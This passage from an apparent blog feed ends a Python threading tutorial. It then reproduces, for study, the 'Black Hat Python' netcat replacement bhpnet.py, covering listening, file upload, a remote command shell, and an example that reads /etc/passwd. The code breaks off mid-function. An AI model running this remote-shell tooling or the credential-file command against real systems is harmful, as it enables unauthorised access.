data-num=\"44\"></td><td><pre>    <span class=\"token comment\">#     print(n)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token comment\">#     sleep(1.5)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\">#     n += 1</span></pre></td></tr></table></figure><h3 id=\"threading02\"><a class=\"anchor\" href=\"#threading02\">#</a> threading02</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>线程是可以共享全局变量的</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>GIL  全局解释器锁</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>ticket <span class=\"token operator\">=</span> <span class=\"token number\">1000</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">global</span> ticket</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        ticket <span class=\"token operator\">-=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># def run2():</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#     global ticket</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#     for i in range(100):</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#         ticket -= 1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\"># 创建线程</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    th1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    th2 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    th3 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    th4 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>run1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">\"th4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\"># 启动</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    th3<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    th4<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    th3<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    th4<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'money:'</span><span class=\"token punctuation\">,</span> ticket<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"threading03\"><a class=\"anchor\" href=\"#threading03\">#</a> threading03</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">global</span> n</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----》task1中的n值是：'</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">global</span> n</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----》task2中的n值是：'</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    th1 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    th2 <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    th1<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    th2<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"最后打印n:\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "multiprocessing",
                "threading"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0(%E4%B8%80)%E2%80%94%E2%80%94%E5%8F%96%E4%BB%A3NetCat/",
            "url": "https://or0kit.github.io/Programming/Python/BHP%E7%AC%AC%E4%BA%8C%E7%AB%A0(%E4%B8%80)%E2%80%94%E2%80%94%E5%8F%96%E4%BB%A3NetCat/",
            "title": "BHP第二章(一)——取代NetCat",
            "date_published": "2020-12-01T14:22:41.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>Python 学了一年了，想进一步提升自己的编程能力。就去看了 Justin Seitz 的《Python 黑帽子》，对 Python 又有了新的认识，准备深研读这本书。</p>\n</blockquote>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>本来想自己改进一下书上写的代码，网上冲浪时发现已经有人早就写了。附上<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTQ5MDcwL2FydGljbGUvZGV0YWlscy8xMDgxOTM1Mzc=\"> https://blog.csdn.net/qq_40549070/article/details/108193537</span></p>\n<h1 id=\"代码\"><a class=\"anchor\" href=\"#代码\">#</a> 代码</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> getopt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> chardet</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 定义一些全局变量</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>listen <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>command <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>execute <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>upload_destination <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>target <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>port <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">usage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BHP Net Tool\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: bhpnet.py -t target_host -p port\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-l --listen    -listen on [host]:[port] for incoming connections\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-e --execute=file_to_run    -execute the given file upon receiving a connection\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-c --command    -initialize a command shell\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-u --upload=destination    -upon receiving connection upload a file and write to [destination]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Examples:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -c\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\\\"cat /etc/passwd\\\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">global</span> listen<span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">,</span> execute<span class=\"token punctuation\">,</span> upload_destination<span class=\"token punctuation\">,</span> target<span class=\"token punctuation\">,</span> port</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token comment\"># 读取命令行选项</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        opts<span class=\"token punctuation\">,</span> args <span class=\"token operator\">=</span> getopt<span class=\"token punctuation\">.</span>getopt<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"hle:t:p:cu:\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"help\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"listen\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"execute=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"target=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"port=\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"command\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"upload=\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">except</span> getopt<span class=\"token punctuation\">.</span>GetoptError <span class=\"token keyword\">as</span> err<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">for</span> o<span class=\"token punctuation\">,</span> a <span class=\"token keyword\">in</span> opts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--help\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            usage<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-l\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--listen\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            listen <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-e\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--execute\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            execute <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-t\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--target\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            target <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-p\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--port\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--command\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>            command <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">elif</span> o <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"-u\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"--upload\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>            upload_destination <span class=\"token operator\">=</span> a</pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            <span class=\"token keyword\">assert</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Unhandled Option\"</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token comment\"># 我们是进行监听还是仅从标准输入发送数据？</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> listen <span class=\"token keyword\">and</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> port <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    \t<span class=\"token comment\"># 从命令行读取内存数据</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    \t<span class=\"token comment\"># 这里将阻塞，所以不在向标准输入发送数据时发送 ctrl-D</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        <span class=\"token builtin\">buffer</span> <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token comment\"># 发送数据</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        client_sender<span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t<span class=\"token comment\"># 我们开始监听并准备上传文件、执行命令</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token comment\"># 放置一个反弹 shell</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t<span class=\"token comment\"># 取决于上面得命令行选项</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">if</span> listen<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        server_loop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">server_loop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">global</span> target</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t<span class=\"token comment\"># 如果没有定义目标，那么我们监听所有接口</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        target <span class=\"token operator\">=</span> <span class=\"token string\">\"0.0.0.0\"</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        client_socket<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token comment\"># 分析一个线程处理新的客户端</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        client_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>client_handler<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        client_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">client_sender</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">buffer</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token comment\"># 连接到目标主机</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    client <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>        client<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">,</span> port<span class=\"token 